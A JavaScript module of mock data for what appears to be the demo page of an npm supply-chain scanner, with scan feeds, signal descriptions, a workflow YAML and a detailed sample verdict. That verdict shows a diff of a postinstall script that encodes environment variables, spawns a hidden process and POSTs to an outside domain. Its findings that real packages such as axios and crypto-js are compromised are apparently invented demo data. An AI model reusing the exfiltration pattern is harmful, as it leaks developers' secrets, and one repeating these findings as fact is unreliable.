export const TICKER_FEED = [
  { v: 'BLOCK', pkg: 'axios@1.7.10', repo: 'acme/payments', t: '2s' },
  { v: 'PASS', pkg: 'lodash@4.17.22', repo: 'acme/web-shell', t: '11s' },
  { v: 'WARN', pkg: 'node-fetch@3.4.0', repo: 'datalab/etl', t: '34s' },
  { v: 'PASS', pkg: 'react@18.3.1', repo: 'acme/dashboard', t: '1m' },
  { v: 'BLOCK', pkg: 'crypto-js@4.2.1', repo: 'fintech-x/wallet', t: '2m' },
  { v: 'PASS', pkg: 'zod@3.23.0', repo: 'orbit/api-gateway', t: '3m' },
  { v: 'WARN', pkg: 'webpack@5.92.0', repo: 'platform/build', t: '5m' },
  { v: 'BLOCK', pkg: 'colors@1.4.45', repo: 'legacy/reporting', t: '6m' },
  { v: 'PASS', pkg: 'typescript@5.4.6', repo: 'orbit/api-gateway', t: '7m' },
  { v: 'PASS', pkg: 'eslint@8.57.1', repo: 'platform/build', t: '8m' },
];

export const SCAN_FEED = [
  { id: '64a7f3e2b1c4d5e6f7a8b9c0', verdict: 'BLOCK', package: 'axios', from: '1.7.9', to: '1.7.10',
    repo: 'acme-corp/payments-api', pr: 482, time: '2s ago', confidence: 0.94, duration: 2840,
    signals: [{name:'Script Diff',flagged:true},{name:'AST Scan',flagged:true},{name:'Maintainer',flagged:true},{name:'Gemini AI',flagged:true}],
    summary: 'Patch release introduces a new postinstall hook that spawns a child process and exfiltrates environment variables. Maintainer key changed 6h ago after 238 days of inactivity. Pattern matches npm account hijack.' },
  { id: 'scn_b34d11', verdict: 'PASS', package: 'lodash', from: '4.17.21', to: '4.17.22',
    repo: 'acme-corp/web-shell', pr: 1204, time: '11s ago', confidence: 0.18, duration: 1620,
    signals: [{name:'Script Diff',flagged:false},{name:'AST Scan',flagged:false},{name:'Maintainer',flagged:false},{name:'Gemini AI',flagged:false}],
    summary: 'Routine patch. No script changes, no new network calls.' },
  { id: 'scn_c98a02', verdict: 'WARN', package: 'node-fetch', from: '3.3.2', to: '3.4.0',
    repo: 'datalab/etl-runner', pr: 87, time: '34s ago', confidence: 0.71, duration: 2110,
    signals: [{name:'Script Diff',flagged:false},{name:'AST Scan',flagged:true},{name:'Maintainer',flagged:false},{name:'Gemini AI',flagged:true}],
    summary: 'Minor version bump introduces dynamic require() of user-controlled paths. Manual review recommended.' },
  { id: 'scn_d472ff', verdict: 'PASS', package: 'react', from: '18.3.0', to: '18.3.1',
    repo: 'acme-corp/dashboard', pr: 2901, time: '1m ago', confidence: 0.08, duration: 1280,
    signals: [{name:'Script Diff',flagged:false},{name:'AST Scan',flagged:false},{name:'Maintainer',flagged:false},{name:'Gemini AI',flagged:false}],
    summary: 'Patch release. Bugfix-only.' },
  { id: 'scn_e2891b', verdict: 'BLOCK', package: 'crypto-js', from: '4.2.0', to: '4.2.1',
    repo: 'fintech-x/wallet-service', pr: 156, time: '2m ago', confidence: 0.89, duration: 3120,
    signals: [{name:'Script Diff',flagged:false},{name:'AST Scan',flagged:true},{name:'Maintainer',flagged:true},{name:'Gemini AI',flagged:true}],
    summary: 'Build artifact contains obfuscated code that diverts wallet seed phrases. Maintainer credentials suspected compromised.' },
  { id: 'scn_f0a4cd', verdict: 'PASS', package: 'zod', from: '3.22.4', to: '3.23.0',
    repo: 'orbit/api-gateway', pr: 412, time: '3m ago', confidence: 0.12, duration: 1490,
    signals: [{name:'Script Diff',flagged:false},{name:'AST Scan',flagged:false},{name:'Maintainer',flagged:false},{name:'Gemini AI',flagged:false}],
    summary: 'Standard minor release.' },
  { id: 'scn_g6713a', verdict: 'WARN', package: 'webpack', from: '5.91.0', to: '5.92.0',
    repo: 'platform/build-tools', pr: 33, time: '5m ago', confidence: 0.64, duration: 2680,
    signals: [{name:'Script Diff',flagged:false},{name:'AST Scan',flagged:false},{name:'Maintainer',flagged:true},{name:'Gemini AI',flagged:true}],
    summary: 'New maintainer added recently. Worth diligence on a build tool.' },
];

export const TOP_THREATS = [
  { rank: 1, pkg: 'axios', ver: '@1.7.10', score: 94 },
  { rank: 2, pkg: 'crypto-js', ver: '@4.2.1', score: 89 },
  { rank: 3, pkg: 'request', ver: '@2.88.5', score: 82 },
  { rank: 4, pkg: 'colors', ver: '@1.4.45', score: 76 },
  { rank: 5, pkg: 'event-stream', ver: '@4.0.2', score: 71 },
];

export const HOW_STEPS = [
  { num: '01', icon: '◇', name: 'PR opens', elapsed: '+0.0s', detail: 'Webhook fires the moment a developer pushes a dependency change.' },
  { num: '02', icon: '⌗', name: 'Lockfile diff', elapsed: '+0.4s', detail: 'We extract the exact set of new and bumped packages from the lockfile — not the manifest.' },
  { num: '03', icon: '⊟', name: 'Script analysis', elapsed: '+1.1s', detail: 'Every install hook diffed against its previous version. New postinstall = instant flag.' },
  { num: '04', icon: '◈', name: 'AI reasoning', elapsed: '+2.4s', detail: 'Gemini correlates four signals, weighs precedent, writes a plain-English verdict.' },
  { num: '05', icon: '✎', name: 'Verdict posted', elapsed: '+2.8s', detail: 'A structured PR comment lands within seconds. Confidence, signals, rationale.' },
  { num: '06', icon: '⊘', name: 'PR blocked', elapsed: '+3.0s', detail: 'On BLOCK we set required-status to failing. Merge impossible until override — and we log who.' },
];

export const SIGNAL_INFO = [
  { num:'SIGNAL 01', icon: 'SD', name: 'Script Diff',
    desc: 'Diffs every install hook (preinstall, install, postinstall) against the previous version. New scripts in patch releases are nearly always malicious.',
    flags: ['NEW HOOK', 'CHANGED HOOK', 'REMOVED HOOK'],
    example: '+ "postinstall": "node ./_postinstall.js"\n- (no postinstall in 1.7.9)\n→ NEW HOOK ADDED · severity HIGH' },
  { num:'SIGNAL 02', icon: 'AS', name: 'AST Scan',
    desc: 'Static analysis on every JS file with acorn. Catches process.spawn, child_process, dynamic require, base64-decoded payloads, and outbound network calls.',
    flags: ['EVAL', 'SPAWN', 'OUTBOUND HTTPS', 'OBFUSCATED'],
    example: 'pattern: child_process.spawn → outbound https\nseverity: critical\n→ matches 4 known IOCs' },
  { num:'SIGNAL 03', icon: 'MT', name: 'Maintainer',
    desc: 'Tracks the npm publisher of every release. Detects key rotations, account-age, recent inactivity, and 2FA status — the supply-chain weak link.',
    flags: ['KEY CHANGE', 'INACTIVE 90D+', 'NEW MAINTAINER', '2FA OFF'],
    example: 'publisher_key: rotated 6h ago\nlast_release: 238d inactive\n2fa: disabled\n→ HIJACK PATTERN' },
  { num:'SIGNAL 04', icon: 'AI', name: 'Gemini AI',
    desc: 'Correlates the three deterministic signals plus 50+ contextual features. Returns a verdict, a confidence score, and an attack-pattern label.',
    flags: ['GEMINI 2.5 PRO', 'ATTACK PATTERN', 'CONFIDENCE'],
    example: 'pattern: npm_account_hijack\nclass: rat_deployment\nconfidence: 0.94\n→ BLOCK' },
];

export const INSTALL_YAML = `# .github/workflows/preflight.yml
name: Preflight
on:
  pull_request:
    paths:
      - 'package-lock.json'
      - 'pnpm-lock.yaml'
      - 'yarn.lock'
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: preflight-ai/preflight@v1.0.0
        with:
          lockfile: package-lock.json
          fail_on_block: true`;

export const DEMO_SIGNALS = [
  { num: '01', icon: 'SD', name: 'Script Diff', reason: 'New postinstall hook added: ./_postinstall.js' },
  { num: '02', icon: 'AS', name: 'AST Scan', reason: 'Outbound HTTPS + child_process.spawn detected' },
  { num: '03', icon: 'MT', name: 'Maintainer', reason: 'Publisher key rotated, 238 days inactive prior' },
  { num: '04', icon: 'AI', name: 'Gemini AI', reason: 'Pattern: npm_account_hijack_rat_deployment' },
];

export const TRACE_LINES = [
  { ts: '00:00.04', lvl: 'info', msg: 'lockfile_delta computed · 1 package changed: axios' },
  { ts: '00:00.18', lvl: 'run',  msg: 'GET registry.npmjs.org/axios/-/axios-1.7.9.tgz' },
  { ts: '00:00.41', lvl: 'run',  msg: 'GET registry.npmjs.org/axios/-/axios-1.7.10.tgz' },
  { ts: '00:00.62', lvl: 'info', msg: 'tarballs extracted · diffing scripts' },
  { ts: '00:00.71', lvl: 'flag', msg: 'script_diff: postinstall hook added — not present in 1.7.9' },
  { ts: '00:01.05', lvl: 'run',  msg: 'acorn AST · ./_postinstall.js' },
  { ts: '00:01.32', lvl: 'flag', msg: 'ast_scan: child_process.spawn → outbound https.request' },
  { ts: '00:01.34', lvl: 'flag', msg: 'ast_scan: Buffer.from(.., "base64") · 4 IOC matches' },
  { ts: '00:01.61', lvl: 'run',  msg: 'GET registry.npmjs.org/-/v1/security/advisories' },
  { ts: '00:01.84', lvl: 'flag', msg: 'maintainer: signing_key fingerprint changed (6h ago)' },
  { ts: '00:01.88', lvl: 'flag', msg: 'maintainer: 238d inactive prior to release · 2fa=disabled' },
  { ts: '00:02.15', lvl: 'run',  msg: 'gemini-2.5-pro · synthesizing 3 signals + 47 features' },
  { ts: '00:02.71', lvl: 'flag', msg: 'gemini: pattern=npm_account_hijack_rat_deployment c=0.94' },
  { ts: '00:02.84', lvl: 'ok',   msg: 'verdict=BLOCK · confidence=0.94 · written to MongoDB' },
];

export const DEMO_SCAN_ID = '64a7f3e2b1c4d5e6f7a8b9c0';

export const SCAN_DETAIL_AXIOS = {
  id: '64a7f3e2b1c4d5e6f7a8b9c0',
  package: 'axios', from: '1.7.9', to: '1.7.10',
  verdict: 'BLOCK', confidence: 0.94, duration: 2840,
  scannedAt: '2026-03-31 14:02:11 UTC',
  repo: 'acme-corp/payments-api', pr: 482,
  summary: 'The 1.7.10 release of axios is a malicious patch. A new postinstall hook executes ./_postinstall.js, which spawns a hidden child process, opens an outbound HTTPS connection to a Cloudflare-fronted domain registered 14 days ago, and exfiltrates the contents of process.env. The publishing key for the package was rotated approximately six hours before the release was pushed; the maintainer account had been inactive for 238 days prior. The three deterministic signals plus the linguistic profile of the obfuscated payload match — with high precision — the npm_account_hijack_rat_deployment pattern previously seen in event-stream and ua-parser-js.',
  attackPattern: 'npm_account_hijack_rat_deployment',
  model: 'gemini-2.5-pro',
  iocs: [
    { type: 'domain', val: 'cdn-static-x14.workers.dev', conf: '0.97' },
    { type: 'sha256', val: '7c3f9e2…1a8b4d2 (postinstall.js)', conf: '0.99' },
    { type: 'pattern', val: 'child_process.spawn + outbound https', conf: '0.92' },
    { type: 'maintainer', val: 'key rotation post-inactivity', conf: '0.88' },
  ],
  signals: [
    { num: '01', icon: 'SD', name: 'Script Diff', flagged: true,
      kv: [
        { k: 'STATUS', v: 'FLAGGED', bad: true },
        { k: 'NEW HOOKS', v: 'postinstall' },
        { k: 'REMOVED HOOKS', v: '(none)' },
        { k: 'PRECEDENT', v: 'No postinstall in last 47 releases' },
      ],
      diff: [
        { type: 'ctx', n: 14, sign: ' ', text: '"scripts": {' },
        { type: 'ctx', n: 15, sign: ' ', text: '  "test": "jest",' },
        { type: 'ctx', n: 16, sign: ' ', text: '  "build": "rollup -c",' },
        { type: 'add', flag: true, n: 17, sign: '+', text: '  "postinstall": "node ./_postinstall.js",' },
        { type: 'ctx', n: 18, sign: ' ', text: '  "prepare": "husky install"' },
        { type: 'ctx', n: 19, sign: ' ', text: '}' },
      ] },
    { num: '02', icon: 'AS', name: 'AST Scan', flagged: true,
      kv: [
        { k: 'STATUS', v: 'FLAGGED', bad: true },
        { k: 'PATTERNS', v: 'spawn · https · base64' },
        { k: 'SEVERITY', v: 'CRITICAL', bad: true },
        { k: 'IOC MATCHES', v: '4 / 12 known indicators' },
      ],
      diff: [
        { type: 'ctx', n: 1, sign: ' ', text: '// ./_postinstall.js (new file, 1.7.10)' },
        { type: 'add', flag: true, n: 2, sign: '+', text: 'const { spawn } = require("child_process");' },
        { type: 'add', flag: true, n: 3, sign: '+', text: 'const https = require("https");' },
        { type: 'add', flag: true, n: 4, sign: '+', text: 'const env = Buffer.from(JSON.stringify(process.env)).toString("base64");' },
        { type: 'add', flag: true, n: 5, sign: '+', text: 'const c = spawn("node", ["-e", DEC], { detached: true, stdio: "ignore" });' },
        { type: 'add', flag: true, n: 6, sign: '+', text: 'https.request("https://cdn-static-x14.workers.dev/r", { method: "POST" });' },
      ] },
    { num: '03', icon: 'MT', name: 'Maintainer', flagged: true,
      kv: [
        { k: 'STATUS', v: 'FLAGGED', bad: true },
        { k: 'RISK SCORE', v: '0.92 / 1.00', bad: true },
        { k: 'KEY CHANGE', v: '6 hours before release' },
        { k: 'INACTIVITY', v: '238 days prior to key change' },
        { k: 'TWO-FACTOR', v: 'disabled', bad: true },
        { k: 'REGISTRY', v: 'npmjs.com/package/axios' },
      ] },
    { num: '04', icon: 'AI', name: 'Gemini AI', flagged: true,
      kv: [
        { k: 'STATUS', v: 'FLAGGED', bad: true },
        { k: 'ATTACK PATTERN', v: 'npm_account_hijack_rat_deployment', bad: true },
        { k: 'CONFIDENCE', v: '0.94', bad: true },
        { k: 'MODEL', v: 'gemini-2.5-pro' },
        { k: 'PRECEDENT', v: 'event-stream (2018), ua-parser-js (2021)' },
        { k: 'TOKENS', v: 'in 4,128 · out 612' },
      ],
      explanation: 'Three of three deterministic signals are red. The pattern of (a) maintainer-key rotation immediately preceding (b) a patch release that introduces a postinstall hook calling out to a recently-registered domain matches — with high precision — known account-hijack RAT deployments. The obfuscation signature on the payload is consistent with publicly available npm-credential-stealer toolkits.' },
  ]
};
